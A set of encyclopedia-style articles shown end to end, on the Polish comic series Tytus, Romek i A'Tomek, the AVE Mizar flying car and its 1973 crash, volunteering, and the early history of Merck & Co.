Tytus, Romek, and A'Tomek) is the longest-published and one of the most popular Polish comic book series, created by Henryk Jerzy Chmielewski (aka Papcio Chmiel) in 1957 and concluded in 2009. It centers on Romek and A'Tomek, two Boy Scouts, and Tytus de Zoo, a chimpanzee with the ability of human speech. Many adventures in Tytus, Romek i A'Tomek have speculative or Science Fiction elements, some are outright parodies of the established genre. The subjects and background themes in all of the books reflect the culture and atmosphere of the time they were drawn and printed. For instance, the early books are dominated by Scouting-related themes and community service, while the 1990s-era books subtly point out the social, economic and cultural changes that occurred in Poland at that time. The dialogues often feature a unique mix of youth slang, slang from the pre- World War II Poland, words from other European languages as well as Chmielewski's humorous neologisms which contain political themes and satire. After 31 volumes and around 10 special issues of the series, Henryk Jerzy Chmielewski announced in May 2009 that the main Tytus, Romek i A'Tomek series will no longer be published, but special albums, including new adventures, are still published periodically. Main characters Tytus de Zoo ‚Äì a chimpanzee and the main hero of the series. Tytus speaks and thinks like a human being and even attends public school together with his friends. However, his animal heritage clearly shines throughhe is presented as wanting to attain humanity, but usually falls short during the hilarious adventures. In the first story drawn by Chmielewski for the ≈öwiat M≈Çodych (Youth's World) magazine, Romek and A‚ÄôTomek find Tytus in a rocket (which at the time was part of the communist anti-American propaganda) as Tytus tells them he was abused by the foreign scientist. In the book version, however, Tytus came to life from a blot of ink the creator Papcio Chmiel accidentally spilled on the floor (this unusual origin fits the slightly surrealistic nature of the books). Tytus, however, many times mentioned (as well as visited) his \\"homeland\\" Trapezfik (which is a reference to Tytus' love for physical activity and a combination of the words \\"trapeze\\" and \\"tumble\\"). * Romek ‚Äì a tall, blond and slim Boy Scout. He often teases Tytus with ever-more creative and insulting comments and is pessimistic about Tytus's attempts to gain knowledge and attain humanity. *A'Tomek ‚Äì the leader of the trio. A short, overweight boy in glasses. He is very intelligent, mature and often the most honorable and well- mannered one. A'Tomek is the leader of the group and the source of most ideas on how to approach the process of \\"humanizing\\" Tytus. His name is wordplay, suggesting atomic energy and in fact is nicknamed \\"A'tom\\" for short by others (there is a Polish name Tomek, a diminutive form of Tomasz (Thomas)). * Professor T. Alent ‚Äì a helpful scientist and one of few recurring characters in the series beside the main trio. He designs and builds various inventions, often flying machines that help the boys during their adventures. Also, he has many lab mice, which are often seen playing in his hair. His name is a wordplay, suggesting talent. *Papcio Chmiel ‚Äì the creator of the series often appeared in the books portraying himself as a fatherly figure to the boys and Tytus and is often shown to have God-like powers (he has been shown making paintings come to life or appearing out of nowhere in the middle of the story and intervening in the adventures). The name \\"Papcio Chmiel\\" literally means \\"Papa Hops\\", however in this case \\"Chmiel\\" is an abbreviation of his last name. *Szympansia ‚Äì Tytus's wife (a chimpanzee as well) brought to life from a painting by Papcio Chmiel. She appeared only in four stories. In other media In 1989 and 1990 two episodes of an animated series were made for Polish public broadcaster TVP but they aired only once. Jerzy Chmielewski disliked this series because of very poor animation and showing his characters in very unsympathetic way. * A Polish band \\"Blenders\\" made a music video about Tytus, Romek and A‚ÄôTomek and used the original animated footage of the characters in it. * In 2002 an animated movie premiered entitled Tytus, Romek i A‚Äôtomek w≈õr√≥d z≈Çodziei marze≈Ñ (Tytus, Romek and A‚ÄôTomek Among the Thieves of Dreams). The film features one of the most acclaimed Polish actors Marek Kondrat as the voice of Tytus and was directed by Leszek Ga≈Çysz. The movie wasn't based on any of the comic books and it had an original plot. Critical response was generally negative. Many fans criticized the movie for lacking the humour and the spirit of the original material, as well dumbing down the characters for the younger children and focusing too much on the main villain Prince Saligia (who wasn't character from the original stories) pushing Romek and A'tomek to the roles of secondary characters 1.

The company was started by Henry Smolinski and Harold Blake, both graduates of Northrop Institute of Technology's aeronautical engineering school. Development The prototypes of the Mizar were made by mating the rear portion of a Cessna Skymaster to a Ford Pinto. The pod-and- twin-boom configuration of the Skymaster was a convenient starting point for a hybrid automobile/airplane. The passenger space and front engine of the Skymaster were removed, leaving an airframe ready to attach to a small car. AVE planned to have its own airframe purpose-built by a subcontractor for production models, rather than depending on Cessna for airframes. According to Petersen's Complete Ford Book, by mid-1973, two prototypes had been built and three more were under construction. One prototype was slated for static display at a Van Nuys Ford dealership, owned by AVE partner Bert Boeckmann. The other prototype, fitted with a Teledyne Continental Motors engine, was unveiled to the press on May 8, 1973. Both vehicles were photographed by Petersen Publishing photographer Mike Brenner for Hot Rod magazine in late April. It then began a series of taxi tests at Van Nuys Airport. AVE made special arrangements to do flight testing at the U.S. Navy's test facilities at Naval Air Station Point Mugu, California. AVE stated that Federal Aviation Administration certification flights were underway in mid-1973.Petersen, Petersen's Complete Ford Book 3rd Edition (1973) The Mizar was intended to use both the aircraft engine and the car engine for takeoff. This would considerably shorten the takeoff roll. Once in the air, the car engine would be turned off. Upon landing, the four-wheel braking would stop the craft in or less. On the ground, telescoping wing supports would be extended and the airframe would be tied down like any other aircraft. The Pinto could be quickly unbolted from the airframe and driven away. Production was scheduled to begin in 1974. AVE had stated that prices would range from US$18,300 to $29,000. On a test flight from Camarillo Airport in California on August 26, 1973, according to test pilot Charles \\"Red\\" Janisse, the right wing strut base mounting attachment failed soon after takeoff. Because turning the aircraft would put too much stress on the unsupported wing, Janisse put the aircraft down in a bean field. After the roadway was closed to traffic, Janisse drove the otherwise undamaged aircraft back to the airport. On September 11, 1973, during a test flight at Camarillo, the right wing strut again detached from the Pinto. With Janisse not available for this test flight, Mizar creator Smolinski was at the controls. Although some reports say the Pinto separated from the airframe, an air traffic controller, watching through binoculars, said the right wing folded. According to Janisse, the wing folded because the pilot tried to turn the aircraft when the wing strut support failed. Smolinski and the Vice President of AVE, Harold Blake, were killed in the resulting fiery crash. Even though the Pinto was a light car, the total aircraft without passengers or fuel was already slightly over the certified gross weight of a Skymaster. However, in addition to poor design and loose parts, the National Transportation Safety Board reported that bad welds were partly responsible for the crash, with the right wing strut attachment failing at a body panel of the Pinto.Accident report ‚Äì NTSB Identification: LAX74FUQ18, National Transportation Safety Board Specifications See alsoList of inventors killed by their own inventions References External linksA Pinto for Icarus *Photos of the flight test (high quality) *Promotional Video *The unflyable Pinto used for the promotional video today Mizar Aircraft first flown in 1973 Abandoned civil aircraft projects of the United States Aircraft manufactured in the United States High-wing aircraft Roadable aircraft Single-engined pusher aircraft 1970s United States civil utility aircraft ","title":"AVE Mizar"},{"id":"30874303","text":"Volunteers sweep the boardwalk in Brooklyn after the 2012 Hurricane Sandy Volunteers complete a cleanup of litter and trash Volunteering is a voluntary act of an individual or group freely giving time and labour for community service. Many volunteers are specifically trained in the areas they work, such as medicine, education, or emergency rescue. Others serve on an as-needed basis, such as in response to a natural disaster. Etymology and history The verb was first recorded in 1755. It was derived from the noun volunteer, in C.1600, \\"one who offers himself for military service,\\" from the Middle French voluntaire. In the non-military sense, the word was first recorded during the 1630s. The word volunteering has more recent usage‚Äîstill predominantly military‚Äîcoinciding with the phrase community service. In a military context, a volunteer army is a military body whose soldiers chose to enter service, as opposed to having been conscripted. Such volunteers do not work \\"for free\\" and are given regular pay. =19th century= During this time, America experienced the Great Awakening. People became aware of the disadvantaged and realized the cause for movement against slavery. In 1851, the first YMCA in the United States was started, followed seven years later by the first YWCA. During the American Civil War, women volunteered their time to sew supplies for the soldiers and the \\"Angel of the Battlefield\\" Clara Barton and a team of volunteers began providing aid to servicemen. Barton founded the American Red Cross in 1881 and began mobilizing volunteers for disaster relief operations, including relief for victims of the Johnstown Flood in 1889. =20th and 21st centuries= Ithaca, Queensland to address an influenza epidemic through the Women's Emergency Corps (later the Women's Volunteer Reserve) in July 1919. The Salvation Army is one of the oldest and largest organizations working for disadvantaged people. Though it is a charity organization, it has organized a number of volunteering programs since its inception. Prior to the 19th century, few formal charitable organizations existed to assist people in need. In the first few decades of the 20th century, several volunteer organizations were founded, including the Rotary International, Kiwanis International, Association of Junior Leagues International, and Lions Clubs International. The Great Depression saw one of the first large-scale, nationwide efforts to coordinate volunteering for a specific need. During World War II, thousands of volunteer offices supervised the volunteers who helped with the many needs of the military and the home front, including collecting supplies, entertaining soldiers on leave, and caring for the injured. After World War II, people shifted the focus of their altruistic passions to other areas, including helping the poor and volunteering overseas. A major development was the Peace Corps in the United States in 1960. When President Lyndon B. Johnson declared a War on Poverty in 1964, volunteer opportunities started to expand and continued into the next few decades. The process for finding volunteer work became more formalized, with more volunteer centers forming and new ways to find work appearing on the World Wide Web. John F. Kennedy greets volunteers on 28 August 1961 According to the Corporation for National and Community Service (in 2012), about 64.5 million Americans, or 26.5 percent of the adult population, gave 7.9 billion hours of volunteer service worth $175 billion. This calculates at about 125‚Äì150 hours per year or 3 hours per week at a rate of $22 per hour. Volunteer hours in the UK are similar; the data for other countries is unavailable. In 1960, after the so-called revolutionary war in Cuba ended, Ernesto Che Guevara created the concept of volunteering work. It was created with the intention that workers across the country volunteer a few hours of work on their work centers. Types = Volunteering as utilized by service learning programs = Many schools on all education levels offer service- learning programs, which allow students to serve the community through volunteering while earning educational credit. According to Alexander Astin in the foreword to Where's the Learning in Service-Learning? by Janet Eyler and Dwight E. Giles, Jr.,\\"...we promote more wide-spread adoption of service- learning in higher education because we see it as a powerful means of preparing students to become more caring and responsible parents and citizens and of helping colleges and universities to make good on their pledge to 'serve society.'\\" When describing service learning, the Medical Education at Harvard says, \\"Service learning unites academic study and volunteer community service in mutually reinforcing ways. ...service learning is characterized by a relationship of partnership: the student learns from the service agency and from the community and, in return, gives energy, intelligence, commitment, time and skills to address human and community needs.\\" Volunteering in service learning seems to have the result of engaging both mind and heart, thus providing a more powerful learning experience; according to Janet Eyler and Dwight E. Giles, it succeeds by the fact that it \\"...fosters student development by capturing student interest...\\" While not recognized by everyone as a legitimate approach, research on the efficacy of service learning has grown. Janet Eyler and Dwight E. Giles conducted a national study of American college students to ascertain the significance of service learning programs, According to Eyler and Giles,\\"These surveys, conducted before and after a semester of community service, examine the impact of service-learning on students.\\" They describe their experience with students involved in service- learning in this way: \\"Students like service-learning. When we sit down with a group of students to discuss service-learning experiences, their enthusiasm is unmistakable. ...it is clear that [the students]believe that what they gain from service-learning differs qualitatively from what they often derive from more traditional instruction.\\" =Skills-based volunteering= Skills-based volunteering is leveraging the specialized skills and the talents of individuals to strengthen the infrastructure of nonprofits, helping them build and sustain their capacity to successfully achieve their missions. This is in contrast to traditional volunteering, where volunteers doing something other than his / her professional work. The average hour of traditional volunteering is valued by the Independent Sector at between $18‚Äì20 an hour. Skills-based volunteering is valued at $40‚Äì500 an hour, depending on the market value of the time. =Volunteering in developing countries= Laura Bush poses with Peace Corps volunteers An increasingly popular form of volunteering among young people, particularly gap year students and graduates, is to travel to communities in the developing world to work on projects with local organisations. Activities include teaching English, working in orphanages, conservation, assisting non-governmental organizations and medical work. International volunteering often aims to give participants valuable skills and knowledge in addition to benefits to the host community and organization. =Virtual volunteering= Also called e-volunteering or online volunteering, virtual volunteering is a volunteer who completes tasks, in whole or in part, offsite from the organization being assisted. They use the Internet and a home, school, telecenter or work computer, or other Internet-connected device, such as a PDA or smartphone. Virtual volunteering is also known as cyber service, telementoring, and teletutoring, as well as various other names. Virtual volunteering is similar to telecommuting, except that instead of online employees who are paid, these are online volunteers who are not paid. =Micro-volunteering= Micro-volunteering is a task performed via an internet-connected device. An individual typically does this task in small, un-paid increments of time. Micro-volunteering is distinct from \\"virtual volunteering\\" in that it typically does not require the individual volunteer to go through an application process, screening process, or training period. =Environmental volunteering= Environmental volunteering refers to the volunteers who contribute towards environmental management or conservation. Volunteers conduct a range of activities including environmental monitoring, ecological restoration such as re-vegetation and weed removal, protecting endangered animals, and educating others about the natural environment. =Volunteering in an emergency= Volunteers assist survivors at the Houston Astrodome following Hurricane Katrina in September 2005. Volunteering often plays a pivotal role in the recovery effort following natural disasters, such as tsunamis, floods, droughts, hurricanes, and earthquakes. For example, the 1995 Great Hanshin-Awaji earthquake in Japan was a watershed moment, bringing in many first-time volunteers for earthquake response. The 2004 Indian Ocean earthquake and tsunami attracted a large number of volunteers worldwide, deployed by non-governmental organizations, government agencies, and the United Nations. During the 2012 hurricane Sandy emergency, Occupy Sandy volunteers, formed a laterally organized rapid-response team that provided much needed help during and after the storm, from food to shelter to reconstruction. It is an example of mutualism at work, pooling resources and assistance and leveraging social media. =Volunteering in schools= Resource poor schools around the world rely on government support or on efforts from volunteers and private donations, in order to run effectively. In some countries, whenever the economy is down, the need for volunteers and resources increases greatly. There are many opportunities available in school systems for volunteers. Yet, there are not many requirements in order to volunteer in a school system. Whether one is a high school or TEFL (Teaching English as a Foreign Language) graduate or college student, most schools require just voluntary and selfless effort. Much like the benefits of any type of volunteering there are great rewards for the volunteer, student, and school. In addition to intangible rewards, volunteers can add relevant experience to their resumes. Volunteers who travel to assist may learn foreign culture and language. Volunteering in schools can be an additional teaching guide for the students and help to fill the gap of local teachers. Cultural and language exchange during teaching and other school activities can be the most essential learning experience for both students and volunteers. =Corporate volunteering= Benefacto, a volunteering brokerage, describe corporate volunteering as \\"Companies giving their employees an allowance of paid time off annually, which they use to volunteer at a charity of their choice.\\" A majority of the companies at the Fortune 500 allow their employees to volunteer during work hours. These formalized Employee Volunteering Programs (EVPs), also called Employer Supported Volunteering (ESV), are regarded as a part of the companies' sustainability efforts and their social responsibility activities. About 40% of Fortune 500 companies provide monetary donations, also known as volunteer grants, to nonprofits as a way to recognize employees who dedicate significant amounts of time to volunteering in the community. According to the information from VolunteerMatch, a service that provides Employee Volunteering Program solutions, the key drivers for companies that produce and manage EVPs are building brand awareness and affinity, strengthening trust and loyalty among consumers, enhancing corporate image and reputation, improving employee retention, increasing employee productivity and loyalty, and providing an effective vehicle to reach strategic goals. In April 2015, David Cameron pledged to give all UK workers employed by companies with more 250 staff mandatory three days‚Äô paid volunteering leave, which if implemented will generate an extra 360 million volunteering hours a year. =Community volunteer work= Volunteers fit new windows at the Sumac Centre in Nottingham, England, UK. Community volunteering, in the US called \\"community service\\", refers globally to those who work to improve their local community. This activity commonly occurs through not for profit organizations, local governments and churches; but also encompasses ad-hoc or informal groups such as recreational sports teams. = Benefits of community volunteer work = There are many proven personal benefits of community volunteerism. Working together with a group of people who have different ethnicity, backgrounds, and views reduces stereotypes. Community volunteerism has also been proven to improve student's academic success. According to Where's the Learning in Service Learning? by Janet Eyler and Dwight E. Giles, immersing oneself into service learning and serving others has many positive effects both academic and personal. Not only does surrounding oneself with new people and learning how to work together as a group help one improve teamwork and relational skills, it reduces stereotypes, increases appreciation of other cultures, and works to allow young people to find others that they relate to. Eyler and Giles noted that at the beginning and end of a college semester that included three hours of community service a week, students reported a much higher regard for cultural differences. At the end of the semester those who had participated in service-learning were noted as saying that the most important things that they had learned were not to judge others, and to appreciate every type of person because everyone shares some similar key characteristics. Community volunteer work has proven to be a powerful predictor in students' academic lives and college experience as a whole. Studies have shown that students who participate in community service as a part of their college course of study have a much higher correlation of completing their degree (Astin, 1992; Pascarella and Terenzini, 1991). In addition, college students who participate in community volunteer projects as a part of their college experience report finding a much greater relevance in their academic studies after completing community volunteer projects. According to University Health Services, studies have found that volunteering can positively impact a student's overall mental and emotional health. =Social volunteering or welfare volunteering= In some European countries government organisations and non-government organisations provide auxiliary positions for a certain period in institutions like hospitals, schools, memorial sites and welfare institutions. The difference to other types of volunteering is that there are strict legal regulations, what organisation is allowed to engage volunteers and about the period a volunteer is allowed to work in a voluntary position. Due to that fact, the volunteer is getting a limited amount as a pocket money from the government. Organizations having the biggest manpower in Europe are the Voluntary social year (German: Freiwilliges Soziales Jahr), with more than 50.000 volunteers per year, and the Federal volunteers service (German: Bundesfreiwilligendienst), with about 30.000 to 40.000 volunteers per year.https://www.bundesfreiwilligendienst.de/fileadmin/de.bundesfreiwilligendienst/content.de/Service/Downloads/BFD_Flyer_engl_web_RZ.pdf = Volunteering at Major Sporting Events = Sochi Olympics 25,000 volunteers worked at the 2014 Sochi Winter Olympics. They supported the organisers in more than 20 functional areas: meeting guests, assisting navigation, organising the opening and closing ceremonies, organising food outlets, etc. Volunteer applications were open to any nationals of Russia and other countries. The Sochi 2014 Organising Committee received about 200,000 applications, 8 applicants per place. Volunteers received training over the course of more than a year at 26 volunteer centres in 17 cities across Russia. The majority of participants were between 17 and 22 years old. At the same time, 3000 applications were submitted from people over 55 years old. Some of them worked as volunteers during the 1980 Olympics in Moscow. It was the first experience with such a large-scale volunteer program in the contemporary Russia.  2017 FIFA Confederations Cup and 2018 FIFA World Cup in Russia  For the first time in its history, Russia hosted the FIFA World Cup from 14 June till 15 July 2018. Moreover, it was the first time the World Cup games were played both in Europe and Asia. The games were to be hosted by 12 stadiums in 11 Russian cities. The volunteer program of the 2018 FIFA World Cup engaged thousands of people from Russia and other countries around the world. The program included several stages: recruitment, selection and training of volunteers, organisation of their work during the championship. The recruitment of volunteers for the FIFA Confederations Cup and the FIFA World Cup via FIFA.com started on 1 June 2016 and closed on 30 December 2016. Some of the volunteers worked at the 2017 FIFA Confederations Cup: 1733 people assisted the organisers in Saint Petersburg, 1590 worked in Moscow, 1261 in Sochi, 1260 in Kazan, a total of 5844 participants. The FIFA World Cup was supported by 17,040 volunteers of the Russia 2018 Local Organising Committee. Candidates living in Russia were selected by 15 volunteer centres in the host cities based in some of Russia's leading higher educational institutions: Synergy University, Moscow State Institute of International Relations, Plekhanov Russian University of Economics, Russian State Social University, Moscow Automobile and Road Construction University, Saint Petersburg State University of Economics, Samara State University, Volga Region State Academy of Physical Culture, Sport and Tourism, Don State Technical University, Ogarev Mordovia State University, Volgograd State University, State University of Nizhny Novgorod, Samara State Aerospace University, Immanuel Kant Baltic Federal University, and Ural Federal University. Candidates from other countries were selected remotely. Candidates had to be at least 18 years old, have a good knowledge of English, have a higher or vocational secondary education, and possess teamwork skills. Volunteers were trained remotely, in volunteer centres and at World Cup venues. Volunteers were providing assistance in a variety of areas: # Distributing accreditations; # Selling and checking tickets; # Assisting radio communications professionals; # Organising leisure and entertainment activities for guests of the event; # Organising food outlets; # Providing interpretation services; # Working with sponsors; # Providing medical services and organising doping control procedures; # Supporting mass media operations; # Organising arrivals and departures of players and guests; # Working with VIP guests; # Assisting players and referees; # Assisting players and guests with accommodation; # Providing navigation assistance to guests; # Assisting TV and radio broadcasting; # Organising transportation; # Managing volunteers; # Organising operations of the stadium; # Monitoring compliance with FIFA social and environmental requirements; # Organising the opening and closing ceremonies of the championship. Their work started ahead of the events: on 10 May 2017 for the 2017 FIFA Confederations Cup, and on 10 May 2018 for the 2018 FIFA World Cup.  Legacy of 2018 FIFA World Cup Volunteer Program: Russian National Competition of Important Social Projects  On 20 October 2017, the Russian National Competition of Important Social Projects \\"Legacy of 2018 FIFA World Cup Volunteer Program\\" was launched. The competition has engaged about 1500 people: applicants to the 2018 FIFA World Cup volunteer program and future city volunteers. The idea of the competition was that anyone could submit a project that would draw the attention of Russian cities residents to the FIFA World Cup in Russia and leave a legacy after the championship was over. The project was expected to produce tangible (work of art, place of attraction for guests and residents in the city, open playground, graffiti, developed areas in city parks, films, etc.) or intangible (events, conferences, festivals, exhibitions) legacy. 26 projects qualified to the final and were supported by the Russia 2018 Local Organising Committee and the host cities of the 2018 FIFA World Cup. The jury included the General Director of the Russia 2018 Local Organising Committee Alexey Sorokin, Ambassador of the 2018 FIFA World Cup in Russia Alexey Smertin and Advisor to the Head of the Federal Tourism Agency Svetlana Sergeeva. Some of the projects were combined or further developed by the Local Organising Committee. Among the projects were: Football Championship for Moms, Ramp Production out of Recycled Plastic, Your Championship Sticker Packs, etc. Volunteer days, weeks and years Designated days, weeks and years observed by a country or as designated by the United Nations to encourage volunteering / community service * Global Youth Service Day * International Volunteer Day * International Year of Volunteers * Join Hands Day * Mandela Day * MLK Day of service * Mitzvah Day * Random Acts of Kindness Day * Sewa Day * Make A Difference Day * World Kindness Day Political view Modern societies share a common value of people helping each other; not only do volunteer acts assist others, but they also benefit the volunteering individual on a personal level.http://www.picketnews.com/archiveDetail.asp?cID=3&id;=8327publisher=Picket News Despite having similar objectives, tension can arise between volunteers and state-provided services. In order to curtail this tension, most countries develop policies and enact legislation to clarify the roles and relationships among governmental stakeholders and their voluntary counterparts; this regulation identifies and allocates the necessary legal, social, administrative, and financial support of each party. This is particularly necessary when some voluntary activities are seen as a challenge to the authority of the state(e.g., on 29 January 2001, President Bush cautioned that volunteer groups should supplement‚Äînot replace‚Äîgovernment agencies‚Äô work).Bush Announces Faith-Based Initiative Volunteering that benefits the state but challenges paid counterparts angers labor unions that represent those who are paid for their volunteer work; this is particularly seen in combination departments, such as volunteer fire departments. =Difficulties in cross- national aid= Difficulties in the cross-national aid model of volunteering can arise when it is applied across national borders. The presence of volunteers who are sent from one state to another can be viewed as a breach of sovereignty and showing a lack of respect towards the national government of the proposed recipients. Thus, motivations are important when states negotiate offers to send aid and when these proposals are accepted, particularly if donors may postpone assistance or stop it altogether. Three types of conditionality have evolved: #Financial accountability: Transparency in funding management to ensure that what is done by the volunteers is properly targeted #Policy reform: Governmental request that developing countries adopt certain social, economic, or environmental policies; often, the most controversial relate to the privatization of services traditionally offered by the state #Development objectives: Asking developing countries to adjust specific time-bound economic objectives Some international volunteer organizations define their primary mission as being altruistic: to fight poverty and improve the living standards of people in the developing world, (e.g. Voluntary Services Overseas has almost 2,000 skilled professionals working as volunteers to pass on their expertise to local people so that the volunteers' skills remain long after they return home). When these organizations work in partnership with governments, the results can be impressive. However, when other organizations or individual First World governments support the work of volunteer groups, there can be questions as to whether the organizations' or governments' real motives are poverty alleviation. Instead, a focus on creating wealth for some of the poor or developing policies intended to benefit the donor states is sometimes reported.ISBN reference for Volunteering Visions, Publisher: The Federation Press, Edited by: Joy Noble and Fiona Johnston, Many low-income countries‚Äô economies suffer from industrialization without prosperity and investment without growth. One reason for this is that development assistance guides many Third World governments to pursue development policies that have been wasteful, ill-conceived, or unproductive; some of these policies have been so destructive that the economies could not have been sustained without outside support. Indeed, some offers of aid have distorted the general spirit of volunteering, treating local voluntary action as contributions in kind, i.e., existing conditions requiring the modification of local people's behavior in order for them to earn the right to donors‚Äô charity. This can be seen as patronizing and offensive to the recipients because the aid expressly serves the policy aims of the donors rather than the needs of the recipients. Moral resources, political capital and civil society Some files for helping people in a volunteers station in Shenzhen, People's Republic of China Based on a case study in China, Xu and Ngai (2011) revealed that the developing grassroots volunteerism can be an enclave among various organizations and may be able to work toward the development of civil society in the developing countries. The researchers developed a \\"Moral Resources and Political Capital\\" approach to examine the contributions of volunteerism in promoting the civil society. Moral resource means the available morals could be chosen by NGOs. Political capital means the capital that will improve or enhance the NGOs‚Äô status, possession or access in the existing political system. Moreover, Xu and Ngai (2011) distinguished two types of Moral Resources: Moral Resource-I and Moral Resource-II (ibid). #Moral Resource I: Inspired by Immanuel Kant‚Äôs (1998 [1787]) argument of \\"What ought I to do,\\" Moral Resource-I will encourage the NGOs‚Äô confidence and then have the courage to act and conquer difficulties by way of answering and confirming the question of \\"What ought I to do.\\"Kant, I. (1998). Critique of pure reason (J. M. D. Meiklejohn, Trans.). Raleigh, NC: Alex Catalogue. #Moral Resource II: given that Adorno (2000) recognizes that moral or immoral tropes are socially determined, Moral Resource-II refers to the morals that are well accepted by the given society.Adorno, T. (2000). Problems of moral philosophy (T. Schroder, Ed. & R. Livingstone, Trans.). Stanford, CA: Stanford University Press. Thanks to the intellectual heritage of Blau and Duncan (1967), two types of political capital were identified: #Political Capital-I refers to the political capital mainly ascribed to the status that the NGO inherited throughout history (e.g., the CYL). #Political Capital-II refers to the Political Capital that the NGOs earned through their hard efforts.Blau, P. M., & Duncan, O. D. (1967). The American occupational structure. New York: Wiley. Obviously, \\"Moral resource-I itself contains the self-determination that gives participants confidence in the ethical beliefs they have chosen\\", almost any organizations may have Moral Resource-I, while not all of them have the societal recognized Moral Resource- II. However, the voluntary service organizations predominantly occupy Moral Resource-II because a sense of moral superiority makes it possible that for parties with different values, goals and cultures to work together in promoting the promotion of volunteering. Thus the voluntary service organizations are likely to win the trust and support of the masses as well as the government more easily than will the organizations whose morals are not accepted by mainstream society. In other words, Moral Resource II helps the grassroots organizations with little Political Capital I to win Political Capital-II, which is a crucial factor for their survival and growth in developing countries such as China. Therefore, the voluntary service realm could be an enclave of the development of civil society in the developing nations. Health benefits Volunteering has the ability to improve the quality of life and health including longevity of those who donate their timehttps://greatergood.berkeley.edu/images/uploads/Post- AltruismHappinessHealth.pdf and research has found that older adults will benefit the most from volunteering. Physical and mental ailments plaguing older adults can be healed through the simple act of helping others; however, one must be performing the good deed from a selfless nature. There are barriers that can prevent older adults from participating in volunteer work, such as socio-economic status, opinions held by others, and even current health issues. However, these barriers can be overcome so that if one would like to be involved in volunteer work they can do so. Volunteering improves not only the communities in which one serves, but also the life of the individual who is providing help to the community. Mental health benefits Volunteering is known not only to be related to happiness but also to increase happiness. Also, giving help was a more important benefit of better reported mental health than receiving help.http://img2.timg.co.il/forums/1_89494618.pdf Studies have also shown that volunteering can cause a decrease in loneliness for those volunteering as well as those for whom people volunteer. Statistics In the United States, statistics on volunteering have historically been limited, according to volunteerism expert Susan J. Ellis. In 2013, the U.S. Current Population Survey (US) included a volunteering supplement which produced statistics on volunteering. Criticisms In the 1960s, Ivan Illich offered an analysis of the role of American volunteers in Mexico in his speech entitled \\"To Hell With Good Intentions\\". His concerns, along with those of critics such as Paulo Freire and Edward Said, revolve around the notion of altruism as an extension of Christian missionary ideology. In addition, he mentions the sense of responsibility/obligation as a factor, which drives the concept of noblesse oblige‚Äîfirst developed by the French aristocracy as a moral duty derived from their wealth. Simply stated, these apprehensions propose the extension of power and authority over indigenous cultures around the world. Recent critiques of volunteering come from Westmier and Kahn (1996) and bell hooks (n√©e Gloria Watkins) (2004). Also, Georgeou (2012) has critiqued the impact of neoliberalism on international aid volunteering. The field of the medical tourism (referring to volunteers who travel overseas to deliver medical care) has recently attracted negative criticism when compared to the alternative notion of sustainable capacities, i.e., work done in the context of long-term, locally-run, and foreign-supported infrastructures. A preponderance of this criticism appears largely in scientific and peer-reviewed literature.Bezruchka, S. (2000). Medical Tourism as Medical Harm to the Third World: Why? For Whom? Wilderness and Environmental Medicine, 11, 77‚Äì78.Roberts, M. (2006). Duffle Bag Medicine. Journal of the American Medical Association, 295, 1491‚Äì1492.Pinto, A.D., & Upshur, R.E.G. (2009). Global Health Ethics for Students. Developing World Bioethics, 9, 1‚Äì10. Recently, media outlets with more general readerships have published such criticisms as well. Another problem noted with volunteering is that it can be used to replace low paid entry positions. This can act to decrease social mobility, with only those capable of affording to work without payment able to gain the experience. Trade unions in the United Kingdom have warned that long term volunteering is a form of exploitation, used by charities to avoid minimum wage legislation.Trade Union Congress (TUV) (2018) Guide to Internships.

Merck Sharp & Dohme (MSD) outside the United States and Canada, is an American multinational pharmaceutical company and one of the largest pharmaceutical companies in the world. Merck is incorporated in New Jersey. In 1887 a German-born, long-time Merck employee, Theodore Weicker, went to the United States to represent the Darmstadt firm. In 1891, with a capital of $200,000 received from E. Merck, Weicker started the American Merck & Co, with headquarters in lower Manhattan. That year George Merck, the twenty-three-year- old son of the then head of E. Merck (and grandson of the founder) joined Weicker in New York. The company was established as the United States subsidiary of the German company Merck, which was founded in 1668 by the Merck family. Merck & Co. was expropriated by the US government during World War I and subsequently established as an independent American company in 1917. While it operates as Merck & Co. in the United States and Canada, the original Merck based in Darmstadt holds the rights to the Merck name everywhere else. Merck & Co. is the world's seventh largest pharmaceutical company by market capitalization and revenue. Its headquarters is located in Kenilworth, New Jersey. The company ranked No. 78 in the 2018 Fortune 500 list of the largest United States corporations by total revenue. Merck & Co. publishes The Merck Manuals, a series of medical reference books for physicians, nurses, technicians, and veterinarians. These include the Merck Manual of Diagnosis and Therapy, the world's best-selling medical reference. The Merck Index, a compendium of chemical compounds, was formerly published by Merck & Co. before being acquired by the Royal Society of Chemistry in 2012. Company history =Roots and early history= The Angel Pharmacy in Darmstadt, the beginning of the Merck company Merck & Co. traces its origins to its original German parent company Merck, which was established by the Merck family in 1668 when Friedrich Jacob Merck purchased a drug store in Darmstadt. In the 19th century, the Merck company evolved from a pharmacy to a major pharmaceutical company and introduced the commercial manufacture of morphine. In 1891, family member George (Georg) Merck emigrated to the United States and set up Merck & Co. in New York as the US subsidiary of the family company. Merck & Co. operated from 1891 to 1917 as the US subsidiary of the Merck Group. =Nationalization= After the U.S entered World War I, the Merck Group's US subsidiary Merck & Co. was confiscated under the Trading with the Enemy Act of 1917. Company head George W. Merck purchased back the stock in 1919, but U.S. Merck remained a separate company from its former German parent. Merck & Co. holds the trademark rights to the \\"Merck\\" name in the United States and Canada, while its former parent company retains the rights in the rest of the world. In 1929, H. K. Mulford Company merged with Sharp and Dohme, Inc. and brought vaccine technology, including immunization of cavalry horses in World War I and delivery of a diphtheria antitoxin to Merck & Co. H.K. Mulford Company was an ‚Äúanimal farm‚Äù producer of smallpox vaccines and the 1902 Mulford smallpox vaccine was found to be based on horsepox. =1950 to 2000= In 1953, Merck & Co. merged with Philadelphia-based Sharp & Dohme, Inc., becoming the largest US drugmaker.Time Magazine: Merck's Merger, March 16, 1953. Retrieved 2012-09-03.The New York Times: Key Facts About Merck, November 3, 2005. Retrieved 2012-09-03. The combined company kept the trade name Merck in the United States and Canada, and as Merck Sharp & Dohme (MSD) outside North America. In 1965 Merck & Co. acquired Charles E. Frosst Ltd. of Montreal, Quebec, Canada (founded 1899) and created Merck-Frosst Canada, Inc., as its Canadian subsidiary and pharmaceutical research facility. Merck & Co. closed this facility in July 2010, and the company was renamed Merck Canada in 2011. The company was incorporated in New Jersey in 1970. It has an operating subsidiary, KBI Inc., which was originally formed as a joint venture with AstraZeneca. During the late 1980s and 1990s, the company also established joint ventures with DuPont to access research and development expertise, and with Johnson & Johnson to sell over-the-counter consumer medications. In November 1993, Merck & Co. completed a $6 billion purchase of Medco Containment Services Inc. Merck & Co. spun Medco off ten years later. =2001 to 2019 = In November 2009, Merck & Co. announced that it would merge with competitor 